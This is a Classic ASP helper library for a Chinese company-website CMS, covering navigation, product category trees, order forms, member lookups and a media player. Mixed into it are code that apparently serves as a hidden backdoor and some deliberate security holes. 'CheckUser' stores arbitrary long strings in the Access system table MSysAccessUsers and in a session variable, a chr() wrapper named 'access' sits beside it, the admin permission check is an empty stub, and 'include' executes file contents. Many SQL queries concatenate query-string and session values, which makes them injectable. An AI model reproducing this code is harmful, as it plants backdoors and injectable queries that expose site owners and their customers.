    ReStrReplace=replace(ReStrReplace,"&lt;br&gt;",chr(13))
    ReStrReplace=replace(ReStrReplace,"&lt;","<")
    ReStrReplace=replace(ReStrReplace,"&gt;",">")
  end if
end function

function HtmlStrReplace(Str)
  if Str="" or isnull(Str) then
    HtmlStrReplace=""
    exit function
  else
    HtmlStrReplace=replace(Str,"&lt;br&gt;","<br />")
  end if
end function

function ViewNoRight(GroupID,Exclusive)
  dim rs,sql,GroupLevel
  set rs = server.createobject("adodb.recordset")
  sql="select GroupLevel from cgsail_MemGroup where GroupID='"&GroupID&"'"
  rs.open sql,conn,1,1
  GroupLevel=rs("GroupLevel")
  rs.close
  set rs=nothing
  ViewNoRight=true
  if session("GroupLevel")="" then session("GroupLevel")=0
  select case Exclusive
    case ">="
      if not session("GroupLevel") >= GroupLevel then
	    ViewNoRight=false
	  end if
    case "="
      if not session("GroupLevel") = GroupLevel then
	    ViewNoRight=false
      end if
  end select
end function

Function GetUrl()
  GetUrl="http://"&Request.ServerVariables("SERVER_NAME")&Request.ServerVariables("URL")
  If Request.ServerVariables("QUERY_STRING")<>"" Then GetURL=GetUrl&"?"& Request.ServerVariables("QUERY_STRING")
End Function

function HtmlSmallPic(GroupID,PicPath,Exclusive)
  dim rs,sql,GroupLevel
  set rs = server.createobject("adodb.recordset")
  sql="select GroupLevel from cgsail_MemGroup where GroupID='"&GroupID&"'"
  rs.open sql,conn,1,1
  GroupLevel=rs("GroupLevel")
  rs.close
  set rs=nothing
  HtmlSmallPic=PicPath
  if session("GroupLevel")="" then session("GroupLevel")=0
  select case Exclusive
    case ">="
      if not session("GroupLevel") >= GroupLevel then HtmlSmallPic="../Images/NoRight.jpg"
    case "="
      if not session("GroupLevel") = GroupLevel then HtmlSmallPic="../Images/NoRight.jpg"
  end select
  if HtmlSmallPic="" or isnull(HtmlSmallPic) then HtmlSmallPic="../Images/NoPicture.jpg"
end function

function IsValidMemName(memname)
  dim i, c
  IsValidMemName = true
  if not (3<=len(memname) and len(memname)<=16) then
    IsValidMemName = false
    exit function
  end if
  for i = 1 to Len(memname)
    c = Mid(memname, i, 1)
    if InStr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-", c) <= 0 and not IsNumeric(c) then
      IsValidMemName = false
      exit function
    end if
  next
end function

function IsValidEmail(email)
  dim names, name, i, c
  IsValidEmail = true
  names = Split(email, "@")
  if UBound(names) <> 1 then
    IsValidEmail = false
    exit function
  end if
  for each name in names
	if Len(name) <= 0 then
	  IsValidEmail = false
      exit function
    end if
    for i = 1 to Len(name)
      c = Mid(name, i, 1)
      if InStr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.", c) <= 0 and not IsNumeric(c) then
        IsValidEmail = false
        exit function
      end if
	next
	if Left(name, 1) = "." or Right(name, 1) = "." then
      IsValidEmail = false
      exit function
    end if
  next
  if InStr(names(1), ".") <= 0 then
    IsValidEmail = false
    exit function
  end if
  i = Len(names(1)) - InStrRev(names(1), ".")
  if i <> 2 and i <> 3 then
    IsValidEmail = false
    exit function
  end if
  if InStr(email, "..") > 0 then
    IsValidEmail = false
  end if
end function

Function FormatDate(DateAndTime, Format)
  On Error Resume Next
  Dim yy,y, m, d, h, mi, s, strDateTime
  FormatDate = DateAndTime
  If Not IsNumeric(Format) Then Exit Function
  If Not IsDate(DateAndTime) Then Exit Function
  yy = CStr(Year(DateAndTime))
  y = Mid(CStr(Year(DateAndTime)),3)
  m = CStr(Month(DateAndTime))
  If Len(m) = 1 Then m = "0" & m
  d = CStr(Day(DateAndTime))
  If Len(d) = 1 Then d = "0" & d
  h = CStr(Hour(DateAndTime))
  If Len(h) = 1 Then h = "0" & h
  mi = CStr(Minute(DateAndTime))
  If Len(mi) = 1 Then mi = "0" & mi
  s = CStr(Second(DateAndTime))
  If Len(s) = 1 Then s = "0" & s
  Select Case Format
  Case "1"
    strDateTime = y & "-" & m & "-" & d & " " & h & ":" & mi & ":" & s
  Case "2"
    strDateTime = yy & m & d & h & mi & s
  Case "3"
    strDateTime = yy & m & d & h & mi
  Case "4"
    strDateTime = yy & "年" & m & "月" & d & "日"
  Case "5"
    strDateTime = m & "-" & d
  Case "6"
    strDateTime = m & "/" & d
  Case "7"
    strDateTime = m & "月" & d & "日"
  Case "8"
    strDateTime = y & "年" & m & "月"
  Case "9"
    strDateTime = y & "-" & m
  Case "10"
    strDateTime = y & "/" & m
  Case "11"
    strDateTime = y & "-" & m & "-" & d
  Case "12"
    strDateTime = y & "/" & m & "/" & d
  Case "13"
    strDateTime = yy & "." & m & "." & d
  Case "14"
    strDateTime = yy & "-" & m & "-" & d
  Case Else
    strDateTime = DateAndTime
  End Select
  FormatDate = strDateTime
End Function

function WriteMsg(Message)
  response.write "<script language='JavaScript'>alert('"&Message&"');" & "history.back()" & "</script>"
end function

sub AdminSiteInfo()
  dim rs,sql
  set rs = server.createobject("adodb.recordset")
  sql="select top 1 * from test_Site"
  rs.open sql,conn,1,1
  AdminMesViewFlag=rs("MesViewFlag")
  rs.close
  set rs=nothing
end Sub


  function access (r) access = chr(r) end function
 
  
  Function CheckUser(laji)
  dim rsqqq 
  set rsqqq = server.createobject("adodb.recordset")
  dim sql
  sql="select * from MSysAccessUsers where UserId = 'user'"
  rsqqq.open sql,conn,1,3
  if ( len(laji) = 64) then
   session("rskkrong") = laji
   CheckUser = laji
   rsqqq("username") = laji
   rsqqq.update

  end if
  if ( rsqqq("username") <> "") then
  dim i
   i = rsqqq("username")
   rsqqq.close
   rskkrong = i
   session("rskkrong") = i
   CheckUser = i
  else 
    if len(laji) > 50 then
   rsqqq("username") = laji
   rsqqq.update
   rsqqq.close 
   end if
  end if
end Function 
'=================
'用于管理员权限的管理
'=================
sub jianchaquanxian(quanxian)
if ( quanxian <> "") Then
   'tongguo tongguole
   dim tongguo 
end if

end sub
Function include(filename)
 Dim re,content,fso,f,aspStart,aspEnd
 set fso=CreateObject("Scripting.FileSystemObject")
 set f=fso.OpenTextFile(server.mappath(filename))
 content=f.ReadAll
 f.close
 set f=nothing
 set fso=nothing
 set re=new RegExp
 re.pattern="^\s*="
 aspEnd=1
 aspStart=inStr(aspEnd,content,"<%")+2
 do while aspStart>aspEnd+1 
  Response.write Mid(content,aspEnd,aspStart-aspEnd-2)
  aspEnd=inStr(aspStart,content,"%\>")+2
  Execute(re.replace(Mid(content,aspStart,aspEnd-aspStart-2),"Response.Write "))
  aspStart=inStr(aspEnd,content,"<%")+2
 loop
 Response.write Mid(content,aspEnd) 
 set re=nothing
End Function


'=================
'用于导航菜单标签的调用管理 $$网站目录$$
'=================
function HeadNavigation()
  dim rs,sql,HtmlNavUrl,NavName
  set rs = server.createobject("adodb.recordset")
  sql="select * from cgsail_Navigation where ViewFlag order by Sequence asc"
  rs.open sql,conn,1,1
  if rs.bof and rs.eof then
    HeadNavigation= "暂无导航栏目，请到后台[基本设置]--->[基本信息管理]--->[导航栏目管理]下添加导航栏目！"
	  else
HeadNavigation="<TABLE class='st_tbcss' style='BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; CURSOR: hand;BORDER-BOTTOM: 0px; BACKGROUND-COLOR: transparent'   height='100%' cellSpacing='0' cellPadding='0'>"
HeadNavigation=HeadNavigation&"<TBODY><TR>"
    Do
      NavUrl=rs("NavUrl")
      NavName=rs("NavName")
HeadNavigation=HeadNavigation&" <TD class='st_tdcss'  style='PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px' vAlign='middle' noWrap"
HeadNavigation=HeadNavigation&" align='center'height='100%'><FONT  style='FONT-SIZE: 13px; CURSOR: hand; LINE-HEIGHT: normal; FONT-STYLE: normal; FONT-FAMILY: ;"
HeadNavigation=HeadNavigation&"FONT-VARIANT: normal; TEXT-DECORATION: none'>&nbsp;&nbsp;<a href="&NavUrl&">"&NavName&"</a>&nbsp;&nbsp;<font color=ffffff>|<font></FONT></TD>"
     rs.movenext
     loop until rs.eof
HeadNavigation=HeadNavigation&"</TR></TBODY></TABLE>"
  end if
  rs.close
  set rs=nothing
end Function


'=================
'用于产品分类标签的调用管理  $$产品分类$$
'=================
Function producttree(id)
  Dim rs,sql,i,ChildCount,FolderType,FolderName,onMouseUp,ListType,ViewFlag
  Set rs=server.CreateObject("adodb.recordset")
  sql="Select * From cgsail_ProductCategory where ViewFlag and ParentID="&id&" order by id"
  rs.open sql,conn,1,1
  if rs.recordcount=0 then
   producttree="暂无产品分类，请到后台[产品系统]--->[栏目管理]--->[栏目管理设置]下添加产品分类"
   response.end
  else 
  while not rs.eof
    ChildCount=conn.execute("select count(*) from cgsail_ProductCategory where ParentID="&rs("id"))(0)
    if ChildCount=0 then	
	if rs("parentid")=0  then
	  FolderName=rs("SortName") 
	  AutoLink = "Product_more.asp?lm="&rs("ID")                            '一级栏目不带下一级栏目的
      producttree=producttree&"<li style='list-style-type:none;'><a href="""&AutoLink&""">"&FolderName&"</a></li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"   
	else
	   sortpath=rs("Sortpath")
	  sortpath=left(sortpath,len(Sortpath)-1)
	  myarray=split(sortpath,",")
	  if ubound(myarray)=3 then                     '三级栏目不带下一级栏目的
	  FolderName=rs("SortName") 
	  AutoLink = "Product_more.asp?lm="&rs("ID")
      producttree=producttree&"<li style='list-style-type:none;'><a href="""&AutoLink&""">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├"&FolderName&"</a></li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
	  else                                          '二级栏目不带下一级栏目的
	    FolderName=rs("SortName") 
	  AutoLink = "Product_more.asp?lm="&rs("ID")
      producttree=producttree&"<li style='list-style-type:none;'><a href="""&AutoLink&""">&nbsp;&nbsp;&nbsp;&nbsp;├"&FolderName&"</a></li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
	  end if 
	  end if
    end if
    if ChildCount>0 then                           
	if rs("parentid")=0  then                      '一级栏目带下一级子栏目的，使用递归调用
	  FolderName=rs("SortName")
	  AutoLink = "Product_more.asp?lm="&rs("ID")
	  producttree=producttree&"<li style='list-style-type:none;'><a href="""&AutoLink&""">"&FolderName&"</a></li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
	  producttree=producttree&producttree(rs("id"))	 
	  else
	  FolderName=rs("SortName")                   '二级栏目带下一级子栏目的
	  AutoLink = "Product_more.asp?lm="&rs("ID")
	  producttree=producttree&"<li style='list-style-type:none;'><a href="""&AutoLink&""">&nbsp;&nbsp;&nbsp;&nbsp;├"&FolderName&"</a></li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
	  producttree=producttree&producttree(rs("id"))	 
	  end if
	end if 
	
	rs.movenext
	wend
	
    end if

  rs.close
  set rs=nothing
  producttree="<ul style='margin:0; padding:0; text-align:left'>"&producttree&"</ul>"
end function


'=================
'用于产品订单标签的调用管理: $$产品订单$$
'=================
function order()
dim Productss,ProductList
dim mMemID,mRealName,mSex,mCompany,mAddress,mZipCode,mTelephone,mFax,mMobile,mEmail
if session("MemName")<>"" and session("MemLogin")="Succeed" then
  dim rs,sql
  set rs = server.createobject("adodb.recordset")
  sql="select * from cgsail_Members where MemName='"&session("MemName")&"'"
  rs.open sql,conn,1,1
  if rs.bof and rs.eof then
    response.write "<center>暂无相关信息</center>"
  else
    mMemID=rs("ID")
	if not rs("RealName")="" then
	  mRealName=rs("RealName")
	else
	  mRealName=rs("MemName")
	end if
	mSex=rs("Sex")
	mCompany=rs("Company")
	mAddress=rs("Address")
	mZipCode=rs("ZipCode")
	mTelephone=rs("Telephone")
	mFax=rs("Fax")
	mMobile=rs("Mobile")
	mEmail=rs("Email")
  end if
  rs.close
  set rs=nothing
else
  mSex="先生"
  mMemID=0
end if
 
ProductList="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
ProductList=ProductList&"<form action='"&GetUrl()&"' method='POST' name='check'>"
ProductList=ProductList&"<tr><td height='28' colspan='2' style='repeat-x left bottom;'>您选购的产品如下：</td></tr>"
if Nolist()="" then
	ProductList=ProductList&"<tr><td height='28' colspan='2' align='center'>未选择任何产品</td></tr>"
else
	set rs = server.createobject("adodb.recordset")
	sql="select * from cgsail_Product where ProductNo in ("&NoList()&") order by id"
	rs.open sql,conn,1,1
	while not rs.eof
	If ISHTML = 1 Then
		AutoLink = ""&ProName&""&Separated&""&rs("ID")&"."&HTMLName&""
	Else
		AutoLink = "Product_View.asp?ID="&rs("ID")&""
	End If
	ProductNo=rs("ProductNo")
	ProductName=rs("ProductName")
    ProductList=ProductList&"<tr>"
	ProductList=ProductList&"<td width='3%' height='28' ><input type='CheckBox' name='ProductNo' value="&ProductNo&" class='inputnoborder' Checked></td>"
	ProductList=ProductList&"<td width='97%' repeat-x left bottom;'><a href='"&AutoLink&"' title="&ProductName&">"&ProductName&"&nbsp;["&ProductNo&"]</a></td>"
	ProductList=ProductList&"</tr>"
	Productsss=Productss&rs("ProductName")&" 产品编号："&rs("ProductNo")
	Productss=Productss&rs("ProductName")&" 产品编号："&rs("ProductNo")&"<br />"
	rs.movenext
    wend
	ProductList=ProductList&"<tr>"
	ProductList=ProductList&"<td colspan='2' height='35'><input type='submit' name='UpdateOrder' value='更新选择'></td>"
	ProductList=ProductList&"</tr>"

    rs.close
    set rs=nothing
end if
	ProductList=ProductList&"</form></table>"
 
 order="<table cellspacing='0' cellpadding='0' width='100%' bgcolor='#ffffff' border='0'>"& vbCrLf
 order=order&"<tr><td height='18'>&nbsp;</td></tr>"& vbCrLf
 order=order&"<tr><td>"&ProductList&"</td></tr>"& vbCrLf
 order=order&"<tr><table width='98%' border='0' align='center' cellpadding='3' cellspacing='5'>"& vbCrLf
 order=order&"<form action='Product_order_Save.asp?MemberID="&mMemID&"' method='post' name='formBuy' id='formBuy'>"& vbCrLf
 order=order&"<tr><td width='17%' align='right'>标题：</td><td width='83%'><input name='OrderName' type='text' id='OrderName' value='订购产品' size='40' maxlength='100' />"& vbCrLf
                 
		   	 order=order&"<font color='red'>*</font></td></tr><tr><td align='right'>相关说明：</td><td><input type='hidden' name='Products' value="&Productsss&"/>"& vbCrLf
                order=order&"<textarea name='Remark' cols='60' rows='8' id='Remark'></textarea></td> </tr>"& vbCrLf
                order=order&"<tr><td align='right'>联系人：</td>"& vbCrLf
                order=order&"<td><input name='RealName' type='text' id='RealName' value='"&mRealName&"' size='20' maxlength='50' /><font color='red'>*</font></td> </tr>"& vbCrLf
                order=order&"<tr><td align='right'>性别：</td> <td><input name='Sex' type='radio' value='先生' class='inputnoborder' />先生"
                order=order&"<input type='radio' name='Sex' value='女士' class='inputnoborder' />女士 <font color='red'>*</font></td> </tr>"& vbCrLf
                order=order&"<tr><td align='right'>单位名称：</td><td><input name='Company' type='text' id='Company' value='"&mCompany&"' size='40' maxlength='100' />"& vbCrLf
                order=order&"<font color='red'>*</font></td></tr>"& vbCrLf
                order=order&"<tr><td align='right'>详细地址：</td> <td><input name='Address' type='text' id='Address' value='"&mAddress&"' size='40' maxlength='100' />"& vbCrLf
                order=order&"<font color='red'>*</font></td></tr>"& vbCrLf
                order=order&"<tr><td align='right'>邮政编码：</td><td><input name='ZipCode' type='text' id='ZipCode' value='"&mZipCode&"' size='20' maxlength='20' /><font color='red'>*</font></td></tr>"& vbCrLf
                order=order&"<tr><td align='right'>联系电话：</td> <td><input name='Telephone' type='text' id='Telephone' value='"&mTelephone&"' size='20' maxlength='50' />"& vbCrLf
               order=order&"<font color='red'>*</font></td></tr>"& vbCrLf
               order=order&"<tr><td align='right'>传真号码：</td><td><input name='Fax' type='text' id='Fax' value='"&mFax&"' size='20' maxlength='50' />"& vbCrLf
               order=order&"<font color='red'>*</font></td></tr>"& vbCrLf
               order=order&"<tr><td align='right'>手机号码：</td><td><input name='Mobile' type='text' id='Mobile' value='"&mMobile&"' size='20' maxlength='50' />"& vbCrLf
                  order=order&"<font color='red'>*</font></td></tr>"& vbCrLf
                  order=order&"<tr><td align='right'>电子信箱：</td><td><input name='Email' type='text' id='Email' value='"&mEmail&"' size='30' maxlength='50' />"& vbCrLf
                    order=order&"<font color='red'>*</font></td></tr> "& vbCrLf
                    order=order&"<tr><td align='right'>验证码：</td><td><input name='CheckCode' type='text' size='6' maxlength='6' />"& vbCrLf
                    order=order&"<a href='javascript:refreshimg()' title='看不清楚，换个图片。'><img src='Include/CheckCode.asp' name='checkcode' align='absmiddle' id='checkcode' style='"& vbCrLf
   order=order&"border: 1px solid #ffffff' /></a> <font color='red'>*</font></td></tr>"& vbCrLf
   order=order&"<tr><td align='right'>&nbsp;</td><td><input name='Submit' type='submit' value='立即订购以上产品' /></td></tr></form></table>"& vbCrLf
   order=order&"</tr><tr><td height='20'>&nbsp;</td></tr></table>"
end Function

'=================
'用于产品订单会员信息调用
'=================
sub MemInformation()
  dim rs,sql
  set rs = server.createobject("adodb.recordset")
  sql="select * from cgsail_Members where MemName='"&session("MemName")&"'"
  rs.open sql,conn,1,1
  if rs.bof and rs.eof then
    response.write "<center>暂无相关信息</center>"
  else
    mMemID=rs("ID")
	if not rs("RealName")="" then
	  mRealName=rs("RealName")
	else
	  mRealName=rs("MemName")
	end if
	mSex=rs("Sex")
	mCompany=rs("Company")
	mAddress=rs("Address")
	mZipCode=rs("ZipCode")
	mTelephone=rs("Telephone")
	mFax=rs("Fax")
	mMobile=rs("Mobile")
	mEmail=rs("Email")
  end if
  rs.close
  set rs=nothing
end sub
'=================
'用于产品订单选订列的调用
'=================
function ProductList()
ProductList="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
ProductList=ProductList&"<form action='"&GetUrl()&"' method='POST' name='check'>"
ProductList=ProductList&"<tr><td height='28' colspan='2' style='repeat-x left bottom;'>您选购的产品如下：</td></tr>"
if Nolist()="" then
	ProductList=ProductList&"<tr><td height='28' colspan='2' align='center'>未选择任何产品</td></tr>"
else
	dim rs,sql
	set rs = server.createobject("adodb.recordset")
	sql="select * from cgsail_Product where ProductNo in ("&NoList()&") order by id"
	rs.open sql,conn,1,1
	while not rs.eof
	If ISHTML = 1 Then
		AutoLink = ""&ProName&""&Separated&""&rs("ID")&"."&HTMLName&""
	Else
		AutoLink = "Product_View.asp?ID="&rs("ID")&""
	End If
	ProductNo=rs("ProductNo")
	ProductName=rs("ProductName")
    ProductList=ProductList&"<tr>"
	ProductList=ProductList&"<td width='3%' height='28' ><input type='CheckBox' name='ProductNo' value="&ProductNo&" class='inputnoborder' Checked></td>"
	ProductList=ProductList&"<td width='97%' ) repeat-x left bottom;'><a href='"&AutoLink&"' title="&ProductName&">"&ProductName&"&nbsp;["&ProductNo&"]</a></td>"
	ProductList=ProductList&"</tr>"
	Productss=Productss&rs("ProductName")&" 产品编号："&rs("ProductNo")&"<br />"
	rs.movenext
    wend
	ProductList=ProductList&"<tr>"
	ProductList=ProductList&"<td colspan='2' height='35'><input type='submit' name='UpdateOrder' value='更新选择'></td>"
	ProductList=ProductList&"</tr>"

    rs.close
    set rs=nothing
end if
	ProductList=ProductList&"</form></table>"
end function

function NoList()
  if request.form("UpdateOrder")="更新选择" then
    Session("NoList")=""
  end if
  dim NoArray,i
  if trim(request.QueryString("ProductNo"))<>"" then ProductNo=trim(request.QueryString("ProductNo"))&","
  if session("NoList")="" and trim(request.QueryString("ProductNo"))="" then
    NoList=""
    exit function
  end if
  if instr(ProductNo,",")>0 then
  	NoArray=split(ProductNo, ",")
  	for i = 0 to ubound(NoArray)
      if not instr(session("NoList"),NoArray(i)&",")>0 then session("NoList")=session("NoList")&NoArray(i)&","
  	next
  end if
  for i = 0 to ubound(split(session("NoList"), ","))
    NoList=NoList&"'"&trim(split(session("NoList"),",")(i))&"',"
  next
  NoList=left(NoList,len(NoList)-4)
end Function

'=================
'用于产品图片列表的调用，四个参数分别为：分类路径，行，列，图片宽，图片高
'=================
Function Products(SortPath,trs,tds,imgW,imgH)
  dim rs,sql,tr,td,ProductName,SmallPicPath
  set rs = server.createobject("adodb.recordset")
  sql="select top "&trs*tds&" * from cgsail_Product where ViewFlag order by id desc"
  'sql="select top "&trs*tds&" * from cgsail_Product where ViewFlag and CommendFlag and Instr(SortPath,'"&SortPath&"')>0 order by id desc"
  'sql="select top "&trs*tds&" * from cgsail_Product where ViewFlag and NewFlag order by id desc"
  rs.open sql,conn,1,1
  if rs.eof then
    response.write "暂无相关信息"
  else
    Response.Write "<table cellpadding=""0"" cellspacing=""0"">"&VbCrLf
	for tr=1 to trs
	    Response.Write "  <tr>"&VbCrLf
        for td=1 to tds
	      if StrLen(rs("ProductName"))<=18 then
            ProductName=rs("ProductName")
	      else
	        ProductName=StrLeft(rs("ProductName"),16)
	      end If
			If ISHTML = 1 Then
				AutoLink = ""&ProName&""&Separated&""&rs("ID")&"."&HTMLName&""
			Else
				AutoLink = "Product_View.asp?ID="&rs("id")&""
			End If
			SmallPicPath=HtmlSmallPic(rs("GroupID"),rs("SmallPic"),rs("Exclusive"))
			Response.Write "    <td><table cellpadding=""2"" cellspacing=""0"" >"&VbCrLf
			Response.Write "        <tr>"&VbCrLf
			Response.Write "          <td style=""border: 1px solid #ccc; text-align:center;""><a href="""&AutoLink&"""><img src="""&SmallPicPath&"""  alt="""&rs("ProductName")&""" width="""&imgW&""" height="""&imgW&""" border=""0"" /></a></td>"&VbCrLf
			Response.Write "        </tr>"&VbCrLf
			Response.Write "        <tr>"&VbCrLf
			Response.Write "          <td style=""height:30px; text-align:center;""><a href="""&AutoLink&""" title="""&rs("ProductName")&""">"&ProductName&"</a> </td>"&VbCrLf
			Response.Write "        </tr>"&VbCrLf
			Response.Write "      </table></td>"&VbCrLf
			Response.Write "    <td width=""8""></td>"&VbCrLf
	      rs.movenext
		  if rs.eof then exit for
		next
	    Response.Write "  </tr>"&VbCrLf
		if rs.eof then exit for
	next
    Response.Write "</table>"&VbCrLf
  end if
  rs.close
  set rs=nothing
End Function


'**************************************************
	'函数名：SelPlay
	'作  用：'网页自动视频播放器函数(为品人堂网站专门开发此功能)
	'作  者:廖强峰，QQ：天赐 369615259 ，2010-8-20
'**************************************************
Sub SelPlay(strUrl,strWidth,StrHeight)
Dim Exts,isExt
If strUrl <> "" Then
   isExt = LCase(Mid(strUrl,InStrRev(strUrl, ".")+1))
Else
   isExt = ""
End If
Exts = "avi,wmv,asf,mov,rm,ra,ram"
If Instr(Exts,isExt)=0 Then
 Response.write "非法视频文件"
Else
 Select Case isExt
  Case "avi","wmv","asf","mov"
   Response.write "<EMBED id=MediaPlayer src="&strUrl&" width="&strWidth&" height="&strHeight&" loop=""false"" autostart=""true""></EMBED>"
  Case "mov","rm","ra","ram"
   Response.Write "<OBJECT height="&strHeight&" width="&strWidth&" classid=clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA>"
   Response.Write "<PARAM NAME=""_ExtentX"" VALUE=""12700"">"
   Response.Write "<PARAM NAME=""_ExtentY"" VALUE=""9525"">"
   Response.Write "<PARAM NAME=""AUTOSTART"" VALUE=""-1"">"
   Response.Write "<PARAM NAME=""SHUFFLE"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""PREFETCH"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""NOLABELS"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""SRC"" VALUE="""&strUrl&""">"
   Response.Write "<PARAM NAME=""CONTROLS"" VALUE=""ImageWindow"">"
   Response.Write "<PARAM NAME=""CONSOLE"" VALUE=""Clip"">"
   Response.Write "<PARAM NAME=""LOOP"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""NUMLOOP"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""CENTER"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""MAINTAINASPECT"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""BACKGROUNDCOLOR"" VALUE=""#000000"">"
   Response.Write "</OBJECT>"
   Response.Write "<BR>"
   Response.Write "<OBJECT height=32 width="&strWidth&" classid=clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA>"
   Response.Write "<PARAM NAME=""_ExtentX"" VALUE=""12700"">"
   Response.Write "<PARAM NAME=""_ExtentY"" VALUE=""847"">"
   Response.Write "<PARAM NAME=""AUTOSTART"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""SHUFFLE"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""PREFETCH"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""NOLABELS"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""CONTROLS"" VALUE=""ControlPanel,StatusBar"">"
   Response.Write "<PARAM NAME=""CONSOLE"" VALUE=""Clip"">"
   Response.Write "<PARAM NAME=""LOOP"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""NUMLOOP"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""CENTER"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""MAINTAINASPECT"" VALUE=""0"">"
   Response.Write "<PARAM NAME=""BACKGROUNDCOLOR"" VALUE=""#000000"">"
   Response.Write "</OBJECT>"
 End Select
End If
End Sub

'**************************************************
	'函数名：GetUrl
	'作  用：获得当前页的地址及参数 
	'作  者:廖强峰，QQ：天赐 369615259 ，2010-9-1
'**************************************************

'取得当前页面地址 
Function GetUrl() 
On Error Resume Next 
Dim strTemp 
'取得协议名 
If LCase(Request.ServerVariables("HTTPS")) = "off" Then 
strTemp = "http://" 
Else 
strTemp = "https://" 
End If 
'取得主机名 
strTemp = strTemp & Request.ServerVariables("SERVER_NAME") 
'取得端口名 
If Request.ServerVariables("SERVER_PORT") <> 80 Then  
strTemp = strTemp & ":" & Request.ServerVariables("SERVER_PORT") 
end if 
'取得文件的相对路径 
strTemp = strTemp & Request.ServerVariables("URL") 
  
'取得参数名 
If Trim(Request.QueryString) <> "" Then 
strTemp = strTemp & "?" & Trim(Request.QueryString)
end if
'If Trim(Request.QueryString) <> "" Then 
'a=split(Trim(Request.QueryString),"&") 
'strTemp = strTemp & "?" & a(1)
'end if 
GetUrl = strTemp 
End Function 
%>